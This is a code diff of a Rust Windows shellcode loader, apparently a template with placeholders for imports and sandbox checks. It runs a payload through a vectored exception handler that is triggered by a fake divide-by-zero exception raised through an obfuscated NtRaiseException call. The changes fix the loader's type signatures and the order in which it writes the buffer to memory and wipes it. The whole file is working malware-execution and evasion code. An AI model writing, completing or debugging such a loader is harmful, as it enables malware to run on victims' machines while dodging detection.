@@ -10,15 +10,17 @@ use std::ptr::null_mut;
 
 use winapi::{
     um::{
-        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, EXCEPTION_POINTERS, PEXCEPTION_POINTERS, EXCEPTION_RECORD, CONTEXT, PEXCEPTION_RECORD, PCONTEXT},
+        winnt::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_RESERVE, PEXCEPTION_POINTERS, EXCEPTION_RECORD, PEXCEPTION_RECORD, PCONTEXT, CONTEXT, RtlCaptureContext},
         libloaderapi::{GetModuleHandleA, GetProcAddress},
-        errhandlingapi::PVECTORED_EXCEPTION_HANDLER,
     },
     shared::{
         ntdef::{NT_SUCCESS, HANDLE},
     },
     ctypes::c_void,
 };
+
+#[allow(non_camel_case_types)]
+type PVECTORED_EXCEPTION_HANDLER = Option<unsafe extern "system" fn(PEXCEPTION_POINTERS) -> i32>;
 
 {{IMPORTS}}
 
@@ -42,12 +44,10 @@ const EXCEPTION_CONTINUE_EXECUTION: i32 = -1; // 0xFFFFFFFF
 const EXCEPTION_CONTINUE_SEARCH: i32 = 0;
 
 // Vectored Exception Handler - must match PVECTORED_EXCEPTION_HANDLER signature
-extern "system" fn veh_handler(exception_info: PEXCEPTION_POINTERS) -> i32 {
-    unsafe {
-        if !SHELLCODE_ADDR.is_null() {
-            let shellcode_fn: extern "system" fn() = std::mem::transmute(SHELLCODE_ADDR);
-            shellcode_fn();
-        }
+unsafe extern "system" fn veh_handler(_exception_info: PEXCEPTION_POINTERS) -> i32 {
+    if !SHELLCODE_ADDR.is_null() {
+        let shellcode_fn: extern "system" fn() = std::mem::transmute(SHELLCODE_ADDR);
+        shellcode_fn();
     }
     EXCEPTION_CONTINUE_EXECUTION
 }
@@ -98,7 +98,7 @@ type FnNtRaiseException = unsafe extern "system" fn(
     PEXCEPTION_RECORD,
     PCONTEXT,
     u32,
-) -> i32;
+) -> ();
 type FnAddVectoredExceptionHandler = unsafe extern "system" fn(
     u32,
     PVECTORED_EXCEPTION_HANDLER,
@@ -173,27 +173,24 @@ fn change_protection_to_rx(mut address: *mut c_void, size: usize) -> bool {
 unsafe fn register_veh_handler() -> bool {
     let f_add_veh: FnAddVectoredExceptionHandler = std::mem::transmute(kernel32_g(OBF_ADD_VECTORED_EXCEPTION_HANDLER));
     
-    let result = f_add_veh(1, veh_handler);
+    let result = f_add_veh(1, Some(veh_handler));
     !result.is_null()
 }
 
 unsafe fn raise_exception() {
     let f_raise: FnNtRaiseException = std::mem::transmute(g(OBF_NT_RAISE_EXCEPTION));
-    
-    // Create exception record for division by zero
+
     let mut exception_record: EXCEPTION_RECORD = std::mem::zeroed();
     exception_record.ExceptionCode = 0xC0000094; // EXCEPTION_INT_DIVIDE_BY_ZERO
     exception_record.ExceptionFlags = 0;
     exception_record.ExceptionRecord = null_mut();
     exception_record.ExceptionAddress = null_mut();
     exception_record.NumberParameters = 0;
-    
-    // NtRaiseException signature: PEXCEPTION_RECORD, PCONTEXT, BOOL
-    let _ = f_raise(
-        &mut exception_record,
-        null_mut(),
-        0,
-    );
+
+    let mut context: CONTEXT = std::mem::zeroed();
+    RtlCaptureContext(&mut context);
+
+    f_raise(&mut exception_record, &mut context, 0);
 }
 
 fn execute_via_veh(mut buf: Vec<u8>) {
@@ -203,13 +200,15 @@ fn execute_via_veh(mut buf: Vec<u8>) {
     }
 
     let base = base.unwrap();
-    common::wipe(&mut buf);
+    let buf_len = buf.len();
 
     if !write_to_memory(base, &buf) {
         return;
     }
 
-    if !change_protection_to_rx(base, buf.len()) {
+    common::wipe(&mut buf);
+
+    if !change_protection_to_rx(base, buf_len) {
         return;
     }
 
@@ -225,7 +224,6 @@ fn execute_via_veh(mut buf: Vec<u8>) {
 }
 
 fn check_environment() -> bool {
-    {{SANDBOX}}
     true
 }
 
